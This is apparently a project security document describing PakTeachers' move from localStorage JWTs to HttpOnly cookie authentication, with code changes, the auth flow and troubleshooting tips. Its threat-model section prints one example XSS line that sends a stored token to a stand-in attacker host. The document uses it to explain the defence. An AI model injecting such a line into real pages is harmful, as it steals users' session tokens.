# Security — HttpOnly Cookie Authentication

This document describes PakTeachers' auth security model after migration from `localStorage` JWT storage to HttpOnly cookies.

---

## The Threat Model: Why This Matters

### The Old Vulnerability (localStorage)

When a JWT is stored in `localStorage`, any JavaScript running on the page can read it:

```js
// An attacker injecting a malicious script could do this:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('pt_token'))
```

This is an **XSS (Cross-Site Scripting)** attack. If a single dependency in the supply chain is compromised, or if any user-generated content is rendered unsafely, the attacker can silently exfiltrate every user's token — granting full API access as that user until the token expires.

### The New Protection (HttpOnly Cookies)

An `HttpOnly` cookie is **completely invisible to JavaScript**. The `document.cookie` API and `fetch`/`axios` cannot read it. The browser attaches it automatically on every same-origin request and never exposes its value to scripts.

```
Set-Cookie: token=<jwt>; HttpOnly; SameSite=Strict; Secure; Max-Age=604800
```

| Attribute | Purpose |
|-----------|---------|
| `HttpOnly` | Blocks all JS access — the core XSS mitigation |
| `SameSite=Strict` | Blocks CSRF: cookie is never sent on cross-origin requests |
| `Secure` | Cookie only transmitted over HTTPS (omitted in local dev) |
| `Max-Age=604800` | 7-day session; browser deletes it after expiry |

Even if an attacker achieves XSS, there is nothing to steal — the token is unreachable from JavaScript.

---

## What Changed

### Backend (`PakTeachers.Api`)

| Area | Before | After |
|------|--------|-------|
| **Login response** | `{ token, username, role }` in JSON body | `{ username, role }` in body; `token` in `Set-Cookie` header |
| **JWT extraction** | `Authorization: Bearer <token>` header | `OnMessageReceived` event reads `Request.Cookies["token"]` |
| **Logout** | No-op (token expired client-side) | Sets `Max-Age=0` to expire the cookie immediately |
| **CORS** | `AllowCredentials()` + specific origins | Unchanged (already correct) |
| **OpenAPI** | Bearer scheme | `CookieAuth` ApiKey scheme on all protected endpoints |

**New file:** `DTOs/LoginResponseDTO.cs` — public login response shape (no token field).

**Key changes in `Program.cs`:**
```csharp
options.Events = new JwtBearerEvents
{
    OnMessageReceived = ctx =>
    {
        var cookie = ctx.Request.Cookies["token"];
        if (!string.IsNullOrEmpty(cookie))
            ctx.Token = cookie;
        return Task.CompletedTask;
    }
};
```

### Frontend (`src/`)

| Area | Before | After |
|------|--------|-------|
| **Token storage** | `localStorage.setItem('pt_token', token)` | Not stored — browser manages cookie |
| **Request auth** | Axios request interceptor adds `Authorization: Bearer` | Removed; `withCredentials: true` sends cookie automatically |
| **401 cleanup** | `localStorage.removeItem('pt_token')` | Removed — cookie expires server-side |
| **Session hydration** | Check `localStorage` for token before calling `/me` | Always call `/me` on mount (cookie is invisible to JS) |

**Key change in `src/lib/api.ts`:**
```ts
const api = axios.create({
  baseURL: '/',
  withCredentials: true,  // tells browser to include HttpOnly cookies
})
```

---

## The New Auth Flow

```
LOGIN
  Browser  ──POST /api/auth/login──────────────────→  Backend
           ←── 200 { username, role }                ─┐
               + Set-Cookie: token=<jwt>; HttpOnly    ─┘ (browser stores silently)

SUBSEQUENT REQUESTS
  Browser  ──GET /api/auth/me (cookie auto-attached)─→  Backend
           ←── 200 { id, username, fullName, role }

LOGOUT
  Browser  ──POST /api/auth/logout────────────────── →  Backend
           ←── 200 + Set-Cookie: token=; Max-Age=0       (browser deletes cookie)
```

No JavaScript ever touches the token value. The browser is the sole custodian.

---

## Troubleshooting

### Cookies Not Being Sent (CORS `AllowAnyOrigin` Conflict)

**Symptom:** API returns 401 on all requests after login; browser DevTools shows no `Cookie` header.

**Cause:** `AllowCredentials()` is **incompatible** with `AllowAnyOrigin()`. The CORS spec forbids it as a security measure — allowing credentials to any arbitrary origin would make CSRF trivial.

**Fix:** Always pair `AllowCredentials()` with `WithOrigins(...)` listing exact origins:
```csharp
policy.WithOrigins("http://localhost:5173", "http://localhost:4173")
      .AllowAnyHeader()
      .AllowAnyMethod()
      .AllowCredentials()  // requires specific origins, not AllowAnyOrigin
```

---

### Cookie Not Set in Dev (Secure Flag / HTTP)

**Symptom:** Login returns 200 but no `Set-Cookie` appears; Network tab shows the response header is missing.

**Cause:** The `Secure` attribute on a cookie tells the browser to only store and transmit it over HTTPS. If the backend is running on plain `http://localhost:5065`, the browser silently discards a `Secure` cookie.

**Current behaviour:** The `Secure` flag is disabled in `Development` environment (`!env.IsDevelopment()`), so local HTTP works without any certificate setup.

**Production:** Ensure the site is served over HTTPS end-to-end. The `Secure` flag is enabled automatically in non-Development environments.

---

### Cookie Not Sent (Domain / Path Mismatch)

**Symptom:** Cookie is set correctly on login but not attached to subsequent API requests.

**Cause:** Browsers only send cookies to the exact domain and path they were issued for. Two common mismatches:

1. **Frontend and backend on different ports without a proxy.** `http://localhost:5173` (Vite) calling `http://localhost:5065` (API) directly is cross-origin. The `SameSite=Strict` policy will block the cookie.

   **Fix:** Use the Vite dev proxy (already configured in `vite.config.ts`):
   ```ts
   proxy: { '/api': { target: 'http://localhost:5065', changeOrigin: true } }
   ```
   All `/api/*` requests go through Vite on port 5173 — same origin as the frontend, so the cookie is sent.

2. **Production domain mismatch.** If the frontend is on `app.pakteachers.com` and the API is on `api.pakteachers.com`, the cookie issued by the API won't be sent to the API from the frontend (different subdomains).

   **Fix for production:** Set `Domain=.pakteachers.com` on the cookie to cover all subdomains, or serve the API and frontend under the same domain with path-based routing (`/api/*` → API server).

---

### Axios Not Sending the Cookie

**Symptom:** Cookie exists in DevTools Application tab but is missing from request headers.

**Cause:** `withCredentials` is not set, so Axios strips cookies on cross-origin requests.

**Fix:** Ensure `withCredentials: true` is set on the Axios instance (not per-request):
```ts
const api = axios.create({ withCredentials: true })
```

---

### Scalar "Try it out" Not Authenticating

**Symptom:** Scalar requests return 401 even after logging in through the UI.

**Cause:** Scalar sends requests from a different origin than the browser page, so the cookie isn't included automatically.

**Workaround:** Use the login endpoint in Scalar first (`POST /api/auth/login`). The browser stores the cookie from the response. Subsequent Scalar requests within the same browser session will include it, provided `withCredentials` is configured in Scalar's fetch (it is — the `CookieAuth` OpenAPI scheme signals this).
